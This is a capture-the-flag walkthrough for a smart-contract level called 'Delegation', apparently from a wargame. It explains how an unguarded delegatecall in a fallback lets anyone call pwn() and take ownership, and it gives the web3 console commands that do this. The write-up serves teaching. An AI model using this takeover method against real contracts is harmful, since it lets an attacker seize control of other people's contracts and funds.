# Delegation

Given code:
```shell

contract Delegate {
  address public owner;

...

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

...

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

## Key take away
- Delegatecall is a low level function that maintains context

## Hack

Step1: Create console variable that is the `pwn` function selector

`var attackData = web3.utils.keccak256("pwn()");`

Step2: Send transaction to `Delegation` contract with attackData. This will jump into the fallbak function

`contract.sendTransaction({data: attackData});`

Step3: Confirm ownership

## Notes

Sending the transaction from `step2` calls no specific function so the fallback is invoked. Durring the deployment (some code has been removed from above block), the `Delegate` contract address is set. 

So while we donot have dirrect access to the `Delegate` contract function `pwn()` we can execute arbitrary calls within the context of `Delegate` from the fallback in `Delegation`. The method here is to create the function selector hash and send it as data. 